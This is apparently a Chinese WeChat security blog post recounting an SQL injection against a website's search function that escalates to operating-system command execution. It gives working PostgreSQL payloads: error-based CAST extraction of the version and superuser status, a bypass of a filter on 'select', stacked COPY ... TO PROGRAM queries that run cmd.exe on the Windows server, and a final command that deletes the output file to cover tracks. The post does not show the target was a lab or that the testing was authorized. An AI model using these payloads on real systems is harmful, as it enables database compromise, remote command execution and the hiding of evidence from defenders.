#  从SQL到命令执行  
原创 略懂安全的三秋
                    略懂安全的三秋  略懂安全的三秋   2026-11-21 09:53  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbAsGVBBowUxBgpZo0ECYp6ZMBNfvkP8Y6OvdLsdgMOMg6u5lBwo4DX2gkPesKiao848e8LG7uQiaibq0IYwvpvbrNHFapRdQHteQQ/640?wx_fmt=jpeg "")  
  
这里有注册，所以先注册一手  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbC3699G2jcJmJOYOgvvDRG1ZMh2Uo7shgfdgxj7sibZ7v75qrGEria7yUnxdzmcMxk2OkNyYr65TKjNc7WyBn3ibcXX8kxwkL5U68/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qzel5kQIPbCycwLGaIhyXCGPLdMh2OK7uAVicnTFxBYFT0S11TIdZnyVnIf8h5N7o8WstQe5KVYBRLA8JVov8rrlibVldGg2Vvl0H970rrnRI/640?wx_fmt=png&from=appmsg "")  
  
很明显注册了也登录不了，干脆测试其他功能  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qzel5kQIPbDlDDEvvjL4M9icicCcb7jQXvKV4FSwjvBESZaNs4LYIMgbIToKTPicc3QhCoTSGBM3ozDmG1qNRan8xzVkAYykMJOIuSpKpX363A/640?wx_fmt=png&from=appmsg "")  
  
有搜索功能，要么XSS 、要么SQL 、要么没有  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qzel5kQIPbAeszUSq2k2icpJ9wx2UhDG7uUbbaFTjvibdG0QRbmayUqe5Av1e2wxREDh6iaNxbCEaCKzsZJ3zkhibBr3gZ9YBUOQgMb8PlCJoLA/640?wx_fmt=png&from=appmsg "")  
  
从某种意义上说我更倾向于  
SQL   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbAaLUPECm9rTx6HIcdXY0pknUfXYu0nBnS4REcL1tKcxGQ2y6uAVjTXVqgtaA9f02DB7yibqFoBicaIkgibBLSVlMvlib7ibuyHYzqE/640?wx_fmt=jpeg "")  
  
单引号报错，看看有没有过滤  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbC3cXJI0Bic7yaUUtdBicPuZWvOI7sbtXuBzYCGgJpwOW2zyKibMVicT5FYIZAQ04tG5BiafLJ6XcPib0OLryfHW6Bta3etMaTDogZnA/640?wx_fmt=jpeg "")  
  
测试发现拦截  
and 、or 、select![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_80@2x.png "")  
  
  
简单获取数据库版本  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbAlriaLgkloFILPicRrbXicEH0Fkz2CyE7kaGGtCPicyGUMiclWBnHk6b9szwH7PlsMWcFv316jeb6YhndlrWia0fjGYk4kPiaHOqM1oc/640?wx_fmt=jpeg "")  
  
1'||CAST(version() AS INT)--  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbC1e3w7m1SkhLZuPbzNjp6ZroZrbj7Cfy6fibdM5uwugibyhcvnAYKicGfwPDUVuzSPQemZ1QX7k8Pk8trLT9EmgQCCt3qiaC3ubp0/640?wx_fmt=jpeg "")  
  
1'||CAST(current_setting('is_superuser') AS INT)--  
  
返回：  
无效的类型 integer 输入语法: "on"，也就是  
当前数据库用户是超级用户  
  
因为拦截  
select，  
改用堆叠查询 + TABLE + COPY + pg_read_file 组合，并用 CAST(<expr> AS INT) 触发 22P02 把任意表达式值回显出来  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qzel5kQIPbD6qmo2E0wJ2ROI0M0WD9o6jyibG62iaWg2yHiarPZibyMfRmlzFFg2fn5BwHZ4tcG9yZnQpKSFSGjUqUxKyKMm5vJMOdsHE07oMoY/640?wx_fmt=png&from=appmsg "")  
  
1';COPY (VALUES(1)) TO PROGRAM 'cmd /c whoami > C:/Windows/Temp/o.txt 2>&1';DO $$BEGIN RAISE EXCEPTION 'OUT %', pg_read_file('C:/Windows/Temp/o.txt');END$$--  
  
之后翻  
翻找找又找到一个  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbAztPtBTorZRJHRKmQdPaLKVfUL7zDksaNBSn5z6DhHNMhjXn1picSlH9bNTicfS4tpcRz6iahsbtiaU7fP259Criay0MBH7LJibd3yY/640?wx_fmt=jpeg "")  
  
使用  
1'; COPY (VALUES(1)) TO PROGRAM 'C:/Windows/System32/cmd.exe /c del /f C:/Windows/Temp/o.txt'; --删除  
C:/Windows/Temp/o.txt就可以跑路了  
  
  
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号略懂安全的三秋不为此承担任何责任，一旦造成后果请自行承担！  
  
